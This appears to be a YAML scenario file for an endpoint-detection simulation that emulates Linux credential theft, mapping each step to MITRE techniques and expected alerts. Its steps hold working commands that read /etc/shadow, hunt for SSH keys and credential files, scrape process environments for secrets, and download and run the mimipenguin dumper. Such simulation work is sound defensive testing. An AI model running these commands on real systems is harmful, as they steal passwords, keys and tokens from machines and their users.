scenario_id: SIM-EDR-001
name: "Credential Dumping — /etc/shadow and Mimipenguin"
version: "1.0"
status: active

plane: EDR
detection_types:
  - BIOC
  - Analytics
  - IOC

uc_ref: UCS-EDR-01
tc_ref: TC-EDR-01
uc_name: "Endpoint Credential Theft Detection"
tc_name: "Linux Credential Harvesting"

mitre_tactic: "TA0006"
mitre_tactic_name: "Credential Access"
mitre_technique: "T1003.008"
mitre_technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
additional_techniques:
  - technique: "T1552.001"
    name: "Unsecured Credentials: Credentials In Files"
  - technique: "T1003"
    name: "OS Credential Dumping"

threat_report: "Unit42 - Rocke: The Champion of Monero Miners"
threat_report_url: "https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/"

execution_identity:
  default: www-data
  options:
    - www-data
    - root
    - nobody
    - svc-backup

push_supported: true
pull_supported: true

external_tools:
  - name: Atomic Red Team
    source: "https://github.com/redcanaryco/atomic-red-team"
    type: script
    install_inline: false
    adapter_ref: TOOL-ATOMIC-RED-TEAM
  - name: mimipenguin
    source: "https://github.com/huntergregal/mimipenguin"
    type: script
    install_inline: true

steps:
  - id: step-01
    name: "Read /etc/passwd for user enumeration"
    command: "cat /etc/passwd | grep -v nologin | grep -v false | grep sh$ && echo '[*] Active shell users enumerated'"
    identity: www-data
    mitre_technique: "T1087.001"
    expected_detections:
      - plane: EDR
        type: Analytics
        description: "Non-root process reading /etc/passwd — user enumeration behavior from web service account"

  - id: step-02
    name: "Attempt to read /etc/shadow"
    command: "cat /etc/shadow 2>/dev/null || unshadow /etc/passwd /etc/shadow 2>/dev/null || echo '[*] Shadow read attempted — access denied as expected for non-root'"
    identity: www-data
    mitre_technique: "T1003.008"
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "Credential file access — /etc/shadow read attempt from non-root service account (www-data)"
      - plane: EDR
        type: Analytics
        description: "Unauthorized shadow file access pattern — credential harvesting behavior"

  - id: step-03
    name: "Search filesystem for SSH keys and credential files"
    command: |
      find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '.bash_history' -o -name '.pgpass' -o -name '.my.cnf' 2>/dev/null | head -20;
      find /root -name 'id_rsa' -o -name '.bash_history' 2>/dev/null | head -10;
      find /tmp /var/tmp -name '*.key' -o -name '*.pem' 2>/dev/null | head -10;
      echo '[*] Credential file search complete'
    identity: www-data
    mitre_technique: "T1552.001"
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "Broad credential file search across home directories — SSH key and history file harvesting"
      - plane: EDR
        type: Analytics
        description: "Recursive filesystem search for credential artifacts from service account context"

  - id: step-04
    name: "Dump process memory for cleartext credentials"
    command: |
      for pid in $(ps aux | grep -E 'sshd|apache|nginx|mysql|postgres' | grep -v grep | awk '{print $2}' | head -5); do
        cat /proc/$pid/maps 2>/dev/null | head -5;
        strings /proc/$pid/environ 2>/dev/null | grep -iE 'pass|pwd|token|key|secret' | head -3;
      done;
      echo '[*] Process memory credential scan complete'
    identity: root
    mitre_technique: "T1003"
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "Process memory reading via /proc — credential extraction from service process memory spaces"
      - plane: EDR
        type: Analytics
        description: "Sequential /proc/pid/environ access pattern — automated credential harvesting across multiple processes"

  - id: step-05
    name: "Download and execute Mimipenguin credential extractor"
    command: "curl -sSL https://raw.githubusercontent.com/huntergregal/mimipenguin/master/mimipenguin.sh -o /tmp/mimipenguin.sh && chmod +x /tmp/mimipenguin.sh && timeout 30 bash /tmp/mimipenguin.sh 2>&1 | tee /tmp/mimi_output.txt || echo '[*] Mimipenguin execution complete'"
    identity: root
    mitre_technique: "T1003"
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "Mimipenguin execution — known credential dumping tool signature detected by XDR Agent"
      - plane: EDR
        type: IOC
        description: "Mimipenguin script hash matches known credential theft tool IOC"
      - plane: EDR
        type: Analytics
        description: "Credential extraction tool downloaded and executed — curl-to-bash pattern with /proc memory access"

cleanup:
  commands:
    - "rm -f /tmp/mimipenguin.sh /tmp/mimi_output.txt"
    - "echo '[CortexSim] SIM-EDR-001 cleanup complete'"

author: "Henry Reed"
created: "2026-04-14"
last_updated: "2026-04-14"
tags:
  - credential-access
  - mimipenguin
  - shadow-file
  - ssh-keys
  - endpoint-security
